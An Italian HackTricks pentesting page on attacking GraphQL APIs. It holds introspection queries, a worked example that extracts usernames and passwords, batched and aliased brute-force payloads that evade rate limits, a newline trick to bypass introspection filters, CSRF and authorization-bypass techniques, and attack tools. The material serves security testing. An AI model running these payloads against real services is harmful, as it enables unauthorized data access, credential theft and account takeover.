# GraphQL

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Introduzione

GraphQL √® **evidenziato** come un'**alternativa efficiente** alle API REST, offrendo un approccio semplificato per interrogare i dati dal backend. A differenza di REST, che spesso richiede numerose richieste su endpoint diversi per raccogliere dati, GraphQL consente di recuperare tutte le informazioni necessarie tramite una **singola richiesta**. Questa semplificazione beneficia notevolmente gli sviluppatori, riducendo la complessit√† dei loro processi di recupero dati.

## GraphQL e Sicurezza

Con l'avvento di nuove tecnologie, tra cui GraphQL, emergono anche nuove vulnerabilit√† di sicurezza. Un punto chiave da notare √® che **GraphQL non include meccanismi di autenticazione di default**. √à responsabilit√† degli sviluppatori implementare tali misure di sicurezza. Senza un'adeguata autenticazione, i punti di accesso GraphQL possono esporre informazioni sensibili a utenti non autenticati, rappresentando un rischio significativo per la sicurezza.

### Attacchi di Directory Brute Force e GraphQL

Per identificare istanze GraphQL esposte, si consiglia di includere specifici percorsi negli attacchi di directory brute force. Questi percorsi sono:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

L'individuazione di istanze GraphQL aperte consente di esaminare le query supportate. Questo √® fondamentale per comprendere i dati accessibili tramite il punto di accesso. Il sistema di introspezione di GraphQL facilita questo fornendo dettagli sulle query supportate da uno schema. Per ulteriori informazioni su questo argomento, fare riferimento alla documentazione di GraphQL sull'introspezione: [**GraphQL: un linguaggio di interrogazione per le API.**](https://graphql.org/learn/introspection/)

### Fingerprint

Lo strumento [**graphw00f**](https://github.com/dolevf/graphw00f) √® in grado di rilevare quale motore GraphQL viene utilizzato su un server e quindi stampa alcune informazioni utili per l'auditor di sicurezza.

#### Query universali <a href="#universal-queries" id="universal-queries"></a>

Per verificare se un URL √® un servizio GraphQL, pu√≤ essere inviata una **query universale**, `query{__typename}`. Se la risposta include `{"data": {"__typename": "Query"}}`, conferma che l'URL ospita un punto di accesso GraphQL. Questo metodo si basa sul campo `__typename` di GraphQL, che rivela il tipo dell'oggetto interrogato.
```javascript
query{__typename}
```
### Enumerazione di base

Di solito, Graphql supporta **GET**, **POST** (x-www-form-urlencoded) e **POST**(json). Tuttavia, per motivi di sicurezza, √® consigliabile consentire solo json per prevenire attacchi CSRF.

#### Introspezione

Per utilizzare l'introspezione per scoprire le informazioni dello schema, eseguire una query sul campo `__schema`. Questo campo √® disponibile sul tipo radice di tutte le query.
```bash
query={__schema{types{name,fields{name}}}}
```
Con questa query troverai il nome di tutti i tipi utilizzati:

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Con questa query puoi estrarre tutti i tipi, i loro campi e gli argomenti (e il tipo degli argomenti). Questo sar√† molto utile per sapere come interrogare il database.

![](<../../.gitbook/assets/image (207) (3).png>)

**Errori**

√à interessante sapere se gli **errori** verranno **mostrati** poich√© contribuiranno con informazioni utili.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../.gitbook/assets/image (205) (1).png>)

**Enumerare lo schema del database tramite introspezione**

{% hint style="info" %}
Se l'introspezione √® abilitata ma la query sopra non viene eseguita, prova a rimuovere le direttive `onOperation`, `onFragment` e `onField` dalla struttura della query.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Query di introspezione inline:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
L'ultima riga di codice √® una query graphql che restituir√† tutte le meta-informazioni dalla graphql (nomi degli oggetti, parametri, tipi...)

![](<../../.gitbook/assets/image (206).png>)

Se l'introspezione √® abilitata, √® possibile utilizzare [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) per visualizzare in una GUI tutte le opzioni.

### Interrogazione

Ora che sappiamo quale tipo di informazioni sono salvate nel database, proviamo a **estrarre alcuni valori**.

Nell'introspezione √® possibile trovare **quali oggetti √® possibile interrogare direttamente** (perch√© non √® possibile interrogare un oggetto solo perch√© esiste). Nell'immagine seguente si pu√≤ vedere che il "_queryType_" si chiama "_Query_" e che uno dei campi dell'oggetto "_Query_" √® "_flags_", che √® anche un tipo di oggetto. Pertanto √® possibile interrogare l'oggetto flag.

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

Si noti che il tipo della query "_flags_" √® "_Flags_", e questo oggetto √® definito come segue:

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

√à possibile vedere che gli oggetti "_Flags_" sono composti da **nome** e **valore**. Quindi √® possibile ottenere tutti i nomi e i valori delle bandiere con la query:
```javascript
query={flags{name, value}}
```
Nota che nel caso in cui l'**oggetto da interrogare** sia di **tipo primitivo** come **stringa** come nell'esempio seguente

![](<../../.gitbook/assets/image (441).png>)

Puoi semplicemente interrogarlo con:
```javascript
query={hiddenFlags}
```
In un altro esempio in cui c'erano 2 oggetti all'interno dell'oggetto "_Query_": "_user_" e "_users_".\
Se questi oggetti non hanno bisogno di alcun argomento per la ricerca, √® possibile **recuperare tutte le informazioni da essi** semplicemente **richiedendo** i dati desiderati. In questo esempio preso da Internet, √® possibile estrarre i nomi utente e le password salvate:

![](<../../.gitbook/assets/image (208).png>)

Tuttavia, in questo esempio, se si prova a farlo, si ottiene questo **errore**:

![](<../../.gitbook/assets/image (210).png>)

Sembra che in qualche modo cercher√† utilizzando l'argomento "_**uid**_" di tipo _**Int**_.\
Comunque, sapevamo gi√† che nella sezione [Enumerazione di base](graphql.md#basic-enumeration) √® stata proposta una query che ci mostrava tutte le informazioni necessarie: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Se leggi l'immagine fornita quando eseguo quella query, vedrai che "_**user**_" aveva l'**argomento** "_**uid**_" di tipo _Int_.

Quindi, eseguendo un leggero bruteforce su _**uid**_, ho scoperto che in _**uid**=**1**_ √® stato recuperato un nome utente e una password:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

Nota che ho **scoperto** che potevo richiedere i **parametri** "_**user**_" e "_**password**_" perch√© se provo a cercare qualcosa che non esiste (`query={user(uid:1){noExists}}`) ottengo questo errore:

![](<../../.gitbook/assets/image (213).png>)

E durante la fase di **enumerazione** ho scoperto che l'oggetto "_**dbuser**_" aveva come campi "_**user**_" e "_**password**_.

**Trucco del dump della stringa di query (grazie a @BinaryShadow\_)**

Se puoi cercare per tipo di stringa, ad esempio: `query={theusers(description: ""){username,password}}` e **cerchi una stringa vuota**, verranno **scaricati tutti i dati**. (_Nota che questo esempio non √® correlato all'esempio dei tutorial, per questo esempio supponi di poter cercare usando "**theusers**" tramite un campo String chiamato "**description**"_).

### Ricerca

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dalla loro **email** e dal loro **nome**; i **film** dal loro **nome** e dalla loro **valutazione**. Le **persone** possono essere amiche tra loro e hanno anche film, indicando relazioni all'interno del database.

√à possibile **cercare** le persone **per** il **nome** e ottenere le loro email:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Puoi **ricercare** le persone **per** il **nome** e ottenere i loro **film sottoscritti**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Nota come viene indicato il recupero del `name` dei `subscribedMovies` della persona.

√à anche possibile **cercare contemporaneamente diversi oggetti**. In questo caso, viene effettuata una ricerca di 2 film:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
O addirittura **relazioni di diversi oggetti utilizzando alias**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutazioni

**Le mutazioni vengono utilizzate per apportare modifiche lato server.**

Nell'**introspezione** √® possibile trovare le **mutazioni dichiarate**. Nell'immagine seguente, il "_MutationType_" viene chiamato "_Mutation_" e l'oggetto "_Mutation_" contiene i nomi delle mutazioni (come ad esempio "_addPerson_" in questo caso):

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

In questa configurazione, un **database** contiene **persone** e **film**. Le **persone** sono identificate dal loro **indirizzo email** e dal loro **nome**; i **film** dal loro **nome** e dalla loro **valutazione**. Le **persone** possono essere amiche tra loro e possono anche avere film, indicando relazioni all'interno del database.

Una mutazione per **creare nuovi** film all'interno del database pu√≤ essere la seguente (in questo esempio la mutazione si chiama `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Nota come i valori e il tipo di dati siano indicati nella query.**

Inoltre, il database supporta un'operazione di **mutazione**, chiamata `addPerson`, che consente la creazione di **persone** insieme alle loro associazioni con gli **amici** e i **film** esistenti. √à fondamentale notare che gli amici e i film devono esistere gi√† nel database prima di collegarli alla persona appena creata.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Esecuzione di un attacco di forza bruta batch in 1 richiesta API

Questa informazione √® stata presa da [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Autenticazione tramite API GraphQL con **l'invio simultaneo di molte query con credenziali diverse** per verificarle. Si tratta di un classico attacco di forza bruta, ma ora √® possibile inviare pi√π di una coppia di login/password per richiesta HTTP grazie alla funzionalit√† di batching di GraphQL. Questo approccio inganner√† le applicazioni di monitoraggio del tasso esterno facendo loro credere che tutto vada bene e che non ci sia un bot di forza bruta che cerca di indovinare le password.

Di seguito puoi trovare la dimostrazione pi√π semplice di una richiesta di autenticazione dell'applicazione, con **3 coppie di email/password diverse alla volta**. Ovviamente √® possibile inviare migliaia di coppie in una singola richiesta allo stesso modo:

![](<../../.gitbook/assets/image (182) (1).png>)

Come possiamo vedere dalla schermata di risposta, la prima e la terza richiesta hanno restituito _null_ e hanno riflettuto le informazioni corrispondenti nella sezione _error_. La **seconda mutazione aveva i dati di autenticazione corretti** e la risposta aveva il token di sessione di autenticazione corretto.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL senza introspezione

Sempre pi√π **endpoint GraphQL stanno disabilitando l'introspezione**. Tuttavia, gli errori che GraphQL genera quando riceve una richiesta imprevista sono sufficienti per strumenti come [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) per ricreare la maggior parte dello schema.

Inoltre, l'estensione di Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **osserva le richieste API GraphQL che passano attraverso Burp** e **costruisce** uno schema GraphQL interno con ogni nuova query che vede. Pu√≤ anche esporre lo schema per GraphiQL e Voyager. L'estensione restituisce una risposta falsa quando riceve una query di introspezione. Di conseguenza, GraphQuail mostra tutte le query, gli argomenti e i campi disponibili per l'uso all'interno dell'API. Per ulteriori informazioni [**controlla qui**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Un bel **wordlist** per scoprire [**entit√† GraphQL pu√≤ essere trovato qui**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Eludere le difese di introspezione di GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **Eludere le difese di introspezione di GraphQL**

Per eludere le restrizioni sulle query di introspezione nelle API, inserire un **carattere speciale dopo la parola chiave `__schema`** risulta efficace. Questo metodo sfrutta le sviste comuni degli sviluppatori nei pattern regex che mirano a bloccare l'introspezione concentrandosi sulla parola chiave `__schema`. Aggiungendo caratteri come **spazi, nuove righe e virgole**, che GraphQL ignora ma potrebbero non essere considerati nei regex, √® possibile eludere le restrizioni. Ad esempio, una query di introspezione con una nuova riga dopo `__schema` potrebbe eludere tali difese:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Se non avete successo, considerate metodi di richiesta alternativi, come le richieste **GET** o **POST con `x-www-form-urlencoded`**, poich√© le restrizioni potrebbero applicarsi solo alle richieste POST.

### **Scoprire le strutture GraphQL esposte**

Quando l'introspezione √® disabilitata, esaminare il codice sorgente del sito web per le query pre-caricate nelle librerie JavaScript √® una strategia utile. Queste query possono essere trovate utilizzando la scheda `Sources` negli strumenti per sviluppatori, fornendo informazioni sullo schema dell'API e rivelando potenziali **query sensibili esposte**. I comandi per cercare all'interno degli strumenti per sviluppatori sono:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF in GraphQL

Se non sai cosa sia CSRF, leggi la seguente pagina:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

L√¨ potrai trovare diversi endpoint GraphQL **configurati senza token CSRF**.

Nota che le richieste GraphQL vengono di solito inviate tramite richieste POST utilizzando il Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Tuttavia, la maggior parte dei punti di accesso GraphQL supporta anche le richieste POST **`form-urlencoded`**:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Pertanto, poich√© le richieste CSRF come quelle precedenti vengono inviate **senza richieste di preflight**, √® possibile **effettuare** **modifiche** nel GraphQL sfruttando un CSRF.

Tuttavia, nota che il nuovo valore predefinito del cookie per il flag `samesite` di Chrome √® `Lax`. Ci√≤ significa che il cookie verr√† inviato solo da un sito web di terze parti nelle richieste GET.

Tieni presente che di solito √® possibile inviare la **richiesta** **query** anche come una richiesta **GET** e il token CSRF potrebbe non essere convalidato in una richiesta GET.

Inoltre, sfruttando un [**attacco XS-Search**](../../pentesting-web/xs-search.md) potrebbe essere possibile estrarre contenuti dal punto finale GraphQL sfruttando le credenziali dell'utente.

Per ulteriori informazioni, **consulta il** [**post originale qui**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Autorizzazione in GraphQL

Molte funzioni GraphQL definite nel punto finale potrebbero controllare solo l'autenticazione del richiedente ma non l'autorizzazione.

La modifica delle variabili di input della query potrebbe portare alla **divulgazione** di dettagli sensibili dell'account [leaked](https://hackerone.com/reports/792927).

La mutazione potrebbe persino portare al dirottamento dell'account cercando di modificare i dati di altri account.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Bypassare l'autorizzazione in GraphQL

[Concatenare le query](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) pu√≤ bypassare un sistema di autenticazione debole.

Nell'esempio seguente √® possibile vedere che l'operazione √® "forgotPassword" e che dovrebbe eseguire solo la query forgotPassword associata ad essa. Questo pu√≤ essere bypassato aggiungendo una query alla fine, in questo caso aggiungiamo "register" e una variabile utente per registrarsi come nuovo utente nel sistema.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Bypassare i limiti di velocit√† utilizzando gli alias in GraphQL

In GraphQL, gli alias sono una potente funzionalit√† che consente di **denominare esplicitamente le propriet√†** durante una richiesta API. Questa capacit√† √® particolarmente utile per recuperare **diverse istanze dello stesso tipo** di oggetto in una singola richiesta. Gli alias possono essere utilizzati per superare la limitazione che impedisce agli oggetti GraphQL di avere pi√π propriet√† con lo stesso nome.

Per una comprensione dettagliata degli alias in GraphQL, si consiglia la seguente risorsa: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Sebbene lo scopo principale degli alias sia ridurre la necessit√† di numerose chiamate API, √® stato identificato un caso d'uso non intenzionale in cui gli alias possono essere sfruttati per eseguire attacchi di forza bruta su un endpoint GraphQL. Ci√≤ √® possibile perch√© alcuni endpoint sono protetti da limitatori di velocit√† progettati per contrastare gli attacchi di forza bruta limitando il **numero di richieste HTTP**. Tuttavia, questi limitatori potrebbero non considerare il numero di operazioni all'interno di ciascuna richiesta. Dato che gli alias consentono l'inclusione di pi√π query in una singola richiesta HTTP, possono eludere tali misure di limitazione della velocit√†.

Considera l'esempio fornito di seguito, che illustra come le query con alias possono essere utilizzate per verificare la validit√† dei codici sconto di un negozio. Questo metodo potrebbe aggirare i limiti di velocit√† poich√© combina diverse query in una singola richiesta HTTP, consentendo potenzialmente la verifica di numerosi codici sconto contemporaneamente.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Strumenti

### Scanner di vulnerabilit√†

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit che pu√≤ essere utilizzato per ottenere schemi e cercare dati sensibili, testare l'autorizzazione, forzare gli schemi e trovare percorsi per un determinato tipo.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Pu√≤ essere utilizzato come standalone o [estensione di Burp](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Pu√≤ essere utilizzato anche come client CLI per automatizzare gli attacchi.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Strumento che elenca i diversi modi per raggiungere un determinato tipo in uno schema GraphQL.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Estensione di Burp per il testing avanzato di GraphQL. Il componente _**Scanner**_ √® il nucleo di InQL v5.0, dove √® possibile analizzare un endpoint GraphQL o un file di schema di introspezione locale. Genera automaticamente tutte le query e le mutazioni possibili, organizzandole in una vista strutturata per l'analisi. Il componente _**Attacker**_ consente di eseguire attacchi batch GraphQL, che possono essere utili per aggirare limiti di velocit√† implementati in modo non corretto.

### Client

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Client GUI
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Client GUI

### Test automatici

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Video che spiega AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Riferimenti

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e a** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
